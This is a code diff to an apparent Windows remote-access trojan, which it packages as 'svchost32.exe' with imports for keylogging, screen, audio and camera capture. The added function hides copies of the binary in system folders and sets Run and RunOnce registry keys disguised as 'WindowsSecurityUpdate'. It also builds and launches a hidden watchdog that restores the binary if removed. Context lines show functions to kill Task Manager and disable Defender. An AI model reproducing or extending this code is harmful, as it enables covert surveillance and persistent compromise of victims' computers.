@@ -1977,10 +1977,10 @@ def create_pyinstaller_command():
 # PyInstaller command to create standalone executable (no Python installation required)
 # Run this command in the directory containing your main.py:
 
-pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --add-data "stealth_enhancer.py;." main.py
+pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" main.py
 
 # Alternative command with additional options for maximum stealth:
-pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --add-data "stealth_enhancer.py;." --hidden-import win32api --hidden-import win32con --hidden-import win32security --hidden-import win32process --hidden-import win32event --hidden-import ctypes --hidden-import wintypes --hidden-import winreg --hidden-import mss --hidden-import numpy --hidden-import cv2 --hidden-import pyaudio --hidden-import pynput --hidden-import pygame --hidden-import websockets --hidden-import speech_recognition --hidden-import psutil --hidden-import PIL --hidden-import pyautogui --hidden-import socketio --hidden-import requests --hidden-import urllib3 --hidden-import warnings --hidden-import uuid --hidden-import os --hidden-import subprocess --hidden-import threading --hidden-import sys --hidden-import random --hidden-import base64 --hidden-import tempfile --hidden-import io --hidden-import wave --hidden-import socket --hidden-import json --hidden-import asyncio --hidden-import platform --hidden-import collections --hidden-import queue --hidden-import math --hidden-import time --hidden-import eventlet main.py
+pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --hidden-import win32api --hidden-import win32con --hidden-import win32security --hidden-import win32process --hidden-import win32event --hidden-import ctypes --hidden-import wintypes --hidden-import winreg --hidden-import mss --hidden-import numpy --hidden-import cv2 --hidden-import pyaudio --hidden-import pynput --hidden-import pygame --hidden-import websockets --hidden-import speech_recognition --hidden-import psutil --hidden-import PIL --hidden-import pyautogui --hidden-import socketio --hidden-import requests --hidden-import urllib3 --hidden-import warnings --hidden-import uuid --hidden-import os --hidden-import subprocess --hidden-import threading --hidden-import sys --hidden-import random --hidden-import base64 --hidden-import tempfile --hidden-import io --hidden-import wave --hidden-import socket --hidden-import json --hidden-import asyncio --hidden-import platform --hidden-import collections --hidden-import queue --hidden-import math --hidden-import time --hidden-import eventlet main.py
 
 # The resulting svchost32.exe will:
 # - Run on any Windows PC without Python installed
@@ -2059,6 +2059,161 @@ def show_pyinstaller_instructions():
     print("- Tamper detection and self-healing")
     print("- Removal tool blocking")
     print("="*80)
+
+def deploy_executable_with_persistence():
+    """Deploy the executable to a stealth location with registry persistence."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Check if svchost32.exe exists in current directory
+        exe_path = os.path.join(os.getcwd(), "svchost32.exe")
+        if not os.path.exists(exe_path):
+            print("[ERROR] svchost32.exe not found in current directory")
+            print("[INFO] Build the executable first using the PyInstaller command")
+            return False
+        
+        # Create stealth deployment location
+        stealth_location = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        # Create directory if it doesn't exist
+        os.makedirs(os.path.dirname(stealth_location), exist_ok=True)
+        
+        # Copy executable to stealth location
+        import shutil
+        shutil.copy2(exe_path, stealth_location)
+        
+        # Set hidden and system attributes
+        subprocess.run(['attrib', '+s', '+h', stealth_location], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Executable deployed to: {stealth_location}")
+        
+        # Create registry persistence
+        try:
+            import winreg
+            
+            # Add to HKCU Run key
+            run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key_path)
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
+            winreg.CloseKey(key)
+            
+            print("[OK] Registry persistence established")
+            
+            # Also add to RunOnce for immediate execution
+            runonce_key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, runonce_key_path)
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
+            winreg.CloseKey(key)
+            
+            print("[OK] RunOnce persistence established")
+            
+        except Exception as e:
+            print(f"[WARN] Registry persistence failed: {e}")
+        
+        # Create additional backup in different location
+        backup_location = os.path.join(
+            os.environ.get('APPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        os.makedirs(os.path.dirname(backup_location), exist_ok=True)
+        shutil.copy2(exe_path, backup_location)
+        subprocess.run(['attrib', '+s', '+h', backup_location], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Backup created at: {backup_location}")
+        
+        # Create tamper protection for the deployed executable
+        tamper_script = f'''
+import os
+import sys
+import time
+import subprocess
+import shutil
+
+def check_and_restore():
+    main_exe = "{stealth_location}"
+    backup_exe = "{backup_location}"
+    
+    while True:
+        try:
+            # Check if main executable exists and is accessible
+            if not os.path.exists(main_exe):
+                # Restore from backup
+                if os.path.exists(backup_exe):
+                    shutil.copy2(backup_exe, main_exe)
+                    print(f"Restored executable from {{backup_exe}}")
+                    
+                    # Restart executable
+                    subprocess.Popen([main_exe], 
+                                   creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Tamper protection error: {{e}}")
+            time.sleep(120)
+
+if __name__ == "__main__":
+    check_and_restore()
+'''
+        
+        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        
+        # Create tamper protection executable using PyInstaller
+        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        with open(tamper_script_path, 'w') as f:
+            f.write(tamper_script)
+        
+        # Build tamper protection executable
+        subprocess.run([
+            'pyinstaller', '--onefile', '--windowed', '--name', 'tamper_protection',
+            tamper_script_path
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Move tamper protection to stealth location
+        tamper_exe = os.path.join('dist', 'tamper_protection.exe')
+        if os.path.exists(tamper_exe):
+            stealth_tamper = os.path.join(
+                os.environ.get('LOCALAPPDATA', ''),
+                'Microsoft',
+                'Windows',
+                'tamper_protection.exe'
+            )
+            shutil.move(tamper_exe, stealth_tamper)
+            subprocess.run(['attrib', '+s', '+h', stealth_tamper], 
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            # Start tamper protection
+            subprocess.Popen([stealth_tamper], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            print(f"[OK] Tamper protection deployed: {stealth_tamper}")
+        
+        print("\n" + "="*80)
+        print("DEPLOYMENT COMPLETE")
+        print("="*80)
+        print(f"Executable deployed to: {stealth_location}")
+        print(f"Backup created at: {backup_location}")
+        print("Registry persistence established")
+        print("Tamper protection active")
+        print("Executable will start on next login")
+        print("="*80)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Deployment failed: {e}")
+        return False
 
 def disable_defender():
     """Attempt to disable Windows Defender (requires admin privileges)."""
@@ -4184,6 +4339,7 @@ def main_loop(agent_id):
         "kill-taskmgr": kill_task_manager,
         "pyinstaller": show_pyinstaller_instructions,
         "advanced-persistence": setup_advanced_persistence,
+        "deploy-executable": deploy_executable_with_persistence,
     }
     
     # Performance monitoring counter
